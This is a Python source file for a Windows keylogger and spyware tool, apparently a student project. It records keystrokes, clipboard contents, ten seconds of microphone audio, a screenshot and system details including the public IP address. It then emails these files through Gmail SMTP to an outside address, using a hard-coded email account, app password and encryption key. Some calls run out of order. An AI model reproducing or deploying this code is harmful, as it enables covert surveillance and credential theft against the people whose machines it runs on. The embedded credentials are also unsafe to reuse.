from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd


import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "xxxmicmac@gmail.com" # Enter disposable email here
password = "iupilwhvgrgflbeq" # Enter email password here

toaddr = "21h51a62c4@cmrcet.ac.in" # Enter the email address you want to send your information to

key = "QN-bLYjcpxOYLbPmghmO3fLC-UjV2HSaN5PBM3--3E8=" # Generate an encryption key from the Cryptography folder

file_path = "D:\\pycharmprojects\\pythonProject" # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)
send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
send_email(system_information, file_path + extend + system_information, toaddr)
send_email(audio_information, file_path + extend + audio_information, toaddr)

def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

def microphone():
    fs = 44100
    duration = microphone_time

    myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    write(audio_information, fs, myrecording)
    write(file_path + extend + audio_information, fs, myrecording)

microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1
        # currentTime = time.time()

        if count >= 1:
           count = 0
           write_file(keys)
           keys = []

    def write_file(keys):
            with open(file_path + extend + keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                       f.write('\n')
                       f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()


    def on_release(key):
            if key == Key.esc:
               return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

    number_of_iterations += 1
    currentTime = time.time()
    stoppingTime = time.time() + time_iteration

